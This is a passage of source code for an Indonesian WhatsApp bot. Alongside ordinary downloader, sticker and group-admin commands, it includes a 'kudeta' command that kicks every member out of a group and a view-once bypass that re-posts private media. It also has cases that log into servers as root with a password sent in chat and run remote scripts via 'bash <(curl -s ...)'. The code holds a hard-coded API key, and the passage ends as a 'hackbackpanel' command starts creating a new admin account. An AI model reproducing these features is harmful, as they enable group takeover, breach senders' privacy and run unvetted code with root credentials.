"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await yilzi.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await yilzi.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await yilzi.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "ssweb": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
screenshotV1, 
screenshotV2,
screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await yilzi.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break

//================================================================================

case "shortlink": case "shorturl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break


case "shortlink-dl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await yilzi.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//================================================================================

case "idgc": case "cekidgc": {
if (!m.isGroup) return Reply(mess.group)
m.reply(m.chat)
}
break

//================================================================================

case "listgc": case "listgrup": {
let teks = `\n *#- List all group chat*\n`
let a = await yilzi.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

//================================================================================

case "cekidch": case "idch": {
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await yilzi.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break

//================================================================================

case "pin": case "pinterest": {
if (!text) return m.reply(example("anime dark"))
await yilzi.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: yilzi.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await yilzi.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await yilzi.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "ai": case "gpt": case "openai": {
let talk = text ? text : "hai"
await fetchJson("https://btch.us.kg/prompt/gpt?prompt=Sekarang%20kamu%20adalah%20yilzizo-AI&text=" + talk).then(async (res) => {
await m.reply(res.result)
}).catch(e => m.reply(e.toString()))
}
break

//================================================================================

case "qc": {
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await yilzi.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#000000",
"width": 812,
"height": 968,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": m.pushName,
"photo": {
"url": ppuser
}
},
"text": text,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
const buffer = Buffer.from(res.data.result.image, 'base64')
let tempnya = "./database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await yilzi.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

//================================================================================

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await yilzi.downloadAndSaveMediaMessage(qmsg)
await yilzi.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

//================================================================================

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await yilzi.downloadAndSaveMediaMessage(qmsg)
await yilzi.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//================================================================================

case "rvo": case "readviewonce": {
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
return yilzi.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
} else if (/image/.test(type)) {
return yilzi.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
} else if (/audio/.test(type)) {
return yilzi.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
} 
}
break

//================================================================================

case "tourl": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await yilzi.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'yilzishop.png');

let teks = directLink.toString()
await yilzi.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//================================================================================

case "tourl2": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await yilzi.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('postimages.org');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'yilzishop.png');
let teks = directLink.toString()
await yilzi.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//================================================================================

case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("id good night"))
}}
break

//================================================================================

case "tohd": case "hd": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let foto = await yilzi.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await yilzi.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break

//================================================================================

case "add": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await yilzi.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await yilzi.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

//================================================================================

case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await yilzi.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await yilzi.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//================================================================================

case "leave": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await yilzi.groupLeave(m.chat)
}
break

//================================================================================

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await yilzi.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//================================================================================

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await yilzi.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await yilzi.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await yilzi.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//================================================================================

case "ht": case "hidetag": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await yilzi.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await yilzi.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//================================================================================

case "get": case "g": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//================================================================================

case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await yilzi.newsletterMetadata("invite", result)
await yilzi.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//================================================================================

case "on": case "off": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let gc = Object.keys(db.groups[m.chat])
if (!text || isNaN(text)) {
let teks = "\n*#- List opstion group settings*\n\n"
await gc.forEach((i, e) => {
teks += `* ${e + 1}. ${capital(i)} : ${db.groups[m.chat][i] ? "_aktif_" : "_tidak aktif_"}\n`
})
teks += `\n Contoh penggunaan *.${command}* 1\n`
return m.reply(teks)
}
const num = Number(text)
let total = gc.length
if (num > total) return
const event = gc[num - 1]
global.db.groups[m.chat][event] = command == "on" ? true : false
return m.reply(`Berhasil *${command == "on" ? "mengaktifkan" : "mematikan"} ${event}* di grup ini`)
}
break

//================================================================================

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await yilzi.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await yilzi.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//================================================================================

case "kudetagc": case "kudeta": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Kudeta Grup By yilzizo Starting 🔥")
for (let i of memberFilter) {
await yilzi.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//================================================================================

case "demote":
case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await yilzi.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await yilzi.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//================================================================================

case "uninstalltema": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}

const command = `bash <(curl -s https://raw.githubusercontent.com/yilzizoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`yilzizodev\n`) // Key Token : yilzizodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemastellar": case "installtemastelar": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}

const command = `bash <(curl -s https://raw.githubusercontent.com/yilzizoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {
await m.reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`yilzizodev\n`) // Key Token : yilzizodev
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}

const command = `bash <(curl -s https://raw.githubusercontent.com/yilzizoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {
await m.reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`yilzizodev\n`) // Key Token : yilzizodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}

const command = `bash <(curl -s https://raw.githubusercontent.com/yilzizoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {
await m.reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`yilzizodev\n`); // Key Token : yilzizodev
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6281359123789\n');
stream.write('https://whatsapp.com/channel/0029VarZaKGLdQedA8hiw42D\n');
stream.write('https://chat.whatsapp.com/CqiwCo3l5Y5BK2sqOY2Amr\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "uninstallpanel": {
if (!isCreator) return m.reply(msg.owner);
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).connect(connSettings)
}
break

//================================================================================

case "installpanel": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const connSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/yilzizoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await yilzi.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Singapore\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('Node By yilzizo\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Node By yilzizo\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('admin@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);
}
break

//================================================================================

case "startwings": case "configurewings": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}

const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {
await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return Reply(mess.owner)
let t = text.split('|')
if (t.length < 2) return m.reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}

